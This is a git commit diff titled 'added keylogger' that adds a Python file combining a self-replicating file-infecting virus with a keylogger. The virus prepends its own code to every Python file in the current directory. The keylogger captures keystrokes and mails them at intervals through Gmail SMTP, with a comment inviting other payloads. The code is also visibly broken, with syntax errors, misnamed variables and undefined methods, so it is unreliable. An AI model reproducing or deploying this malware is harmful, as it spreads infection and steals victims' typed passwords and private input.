1b09c096dbe5a4f1f8494a9829b29207eb004d23
Carter <carterthayer@protonmail.com>
2021-05-06 19:07:38 -0400

    added keylogger

---
+++ iwantKeys.py
@@ -0,0 +1,148 @@
+# VIRUS SAYS HI!
+
+import sys
+import glob
+import keyboard # for keylogs
+import smtplib # for sending email using SMTP protocol (gmail)
+# Timer is to make a method runs after an `interval` amount of time
+from threading import Timer
+from datetime import datetime
+
+virus code = []
+
+with open(sys.argv[0], 'r') as f:
+    lines = f.readlines()
+
+self_replicating_part = False
+for line in lines: 
+    if line == "# VIRUS SAYS HI!":
+        self_replicating_part = True
+    if not self_replicating_part:
+        virus_code.append(line)
+    if line == "# VIRUS SAYS BYE!\n":
+        break
+
+# Find al python files in current dir:
+python_files = glob.glob('*.py') + glob.glob('*.pyw')
+
+for file in python_files:
+    with open(files, 'r') as f:
+        file_code = f.readlines()
+
+    infected = False
+
+    for line in file_code:
+        if line == "# VIRUS SAYS HI!\n":
+            infected = True
+            break
+
+    if not infected: 
+        final_code = []
+        final_code.extend(virus_code)
+        final_code.extend('\n')
+        final_code.extend(file_code)
+
+        with open(file, 'w') as f:
+            f.writelines(final_code)
+
+# Call for malicious code. Could be a piece of code, payload, code to download other viruses, run a keylogger, etc.
+def malicious_code():
+  # Reports every 60 seconds to your email: 
+  # Change credentials:
+    SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
+    EMAIL_ADDRESS = "thisisafakegmail@gmail.com"
+    EMAIL_PASSWORD = "thisisafakepassword"
+    
+class Keylogger:
+    def __init__(self, interval, report_method="email"):
+        # we gonna pass SEND_REPORT_EVERY to interval
+        self.interval = interval
+        self.report_method = report_method
+        # this is the string variable that contains the log of all 
+        # the keystrokes within `self.interval`
+        self.log = ""
+        # record start & end datetimes
+        self.start_dt = datetime.now()
+        self.end_dt = datetime.now()
+        
+    def callback(self, event):
+        """
+        This callback is invoked whenever a keyboard event is occured
+        (i.e when a key is released in this example)
+        """
+        name = event.name
+        if len(name) > 1:
+            # not a character, special key (e.g ctrl, alt, etc.)
+            # uppercase with []
+            if name == "space":
+                # " " instead of "space"
+                name = " "
+            elif name == "enter":
+                # add a new line whenever an ENTER is pressed
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                # replace spaces with underscores
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        # finally, add the key name to our global `self.log` variable
+        self.log += name
+        
+    def sendmail(self, email, password, message):
+        # manages a connection to the SMTP server
+        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+        # connect to the SMTP server as TLS mode ( for security )
+        server.starttls()
+        # login to the email account
+        server.login(email, password)
+        # send the actual message
+        server.sendmail(email, email, message)
+        # terminates the session
+        server.quit()
+        
+    def report(self):
+        """
+        This function gets called every `self.interval`
+        It basically sends keylogs and resets `self.log` variable
+        """
+        if self.log:
+            # if there is something in log, report it
+            self.end_dt = datetime.now()
+            # update `self.filename`
+            self.update_filename()
+            if self.report_method == "email":
+                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+            elif self.report_method == "file":
+                self.report_to_file()
+            # if you want to print in the console, uncomment below line
+            # print(f"[{self.filename}] - {self.log}")
+            self.start_dt = datetime.now()
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        # set the thread as daemon (dies when main thread die)
+        timer.daemon = True
+        # start the timer
+        timer.start()
+        
+    def start(self):
+        # record the start datetime
+        self.start_dt = datetime.now()
+        # start the keylogger
+        keyboard.on_release(callback=self.callback)
+        # start reporting the keylogs
+        self.report()
+        # block the current thread, wait until CTRL+C is pressed
+        keyboard.wait()
+        
+    if __name__ == "__main__":
+    # if you want a keylogger to send to your email
+    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
+    # if you want a keylogger to record keylogs to a local file 
+    # (and then send it using your favorite method)
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+    keylogger.start()
+
+malicious_code()
+
+# VIRUS SAYS BYE!
